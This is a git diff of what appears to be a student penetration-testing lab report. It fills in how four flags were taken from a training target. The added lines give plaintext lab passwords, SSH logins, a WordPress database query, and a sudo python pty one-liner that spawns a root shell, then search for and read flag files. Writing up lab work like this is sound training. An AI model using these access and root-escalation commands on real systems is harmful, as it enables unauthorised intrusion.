@@ -11,7 +11,6 @@ This is a private github repository meant to submit all of my findings and answe
 - Suggestions for Going Further
 
 ### Network Topology
-_TODO: Fill out the information below._
 
 The following machines were identified on the network:
 - TARGET1
@@ -91,7 +90,6 @@ This scan identifies the services below as potential points of entry:
   - Port 22 SSH
   - Port 80 HTTP
 
-_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._
 
 The following vulnerabilities were identified on each target:
 - Target 1
@@ -102,7 +100,6 @@ The following vulnerabilities were identified on each target:
 ![vulnerability scan 1](https://github.com/Zatoid/Final-Project/blob/main/screenshots/vuln_scan_1.PNG)
 ![vulnerability scan 2](https://github.com/Zatoid/Final-Project/blob/main/screenshots/vuln_scan_2.PNG)
 
-_TODO: Include vulnerability scan results to prove the identified vulnerabilities._
 
 ### Exploitation
 _TODO: Fill out the details below. Include screenshots where possible._
@@ -115,17 +112,30 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - Brute forcing weak password credentials
         - Reading confidential files
       - **Commands**:
-        - ssh michael@192.168.1.110
+        - ssh michael@192.168.1.110 password: michael
         - cat /var/www/html/service.html
+[]
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
     - **Exploit Used**
       - _TODO: Brute forcing weak password credentials
       - _TODO: Reading confidential file
+      - **Commands**
+        - ssh michael@192.168.1.110 password: michael
+        - cat /var/www/flag2.txt
   - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
     - **Exploit Used**
-      - todo
-      - todo
+      - **Exploits**
+        - Wordpress access due credentials being displayed in a publically accessible file.
+      - **Commands**
+        - Select * FROM wp_posts;
   - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
     - **Exploit Used**
-      - todo
-      - todo
+      - **Exploits**
+        - Weak credentials
+        - Wordpress access
+      - **Commands**
+        - ssh steven@192.168.1.110 password: pink84
+        - sudo python -c 'import pty;pty.spawn("/bin/bash")'
+        - cd /
+        - find -iname *flag*
+        - cat flag4.txt
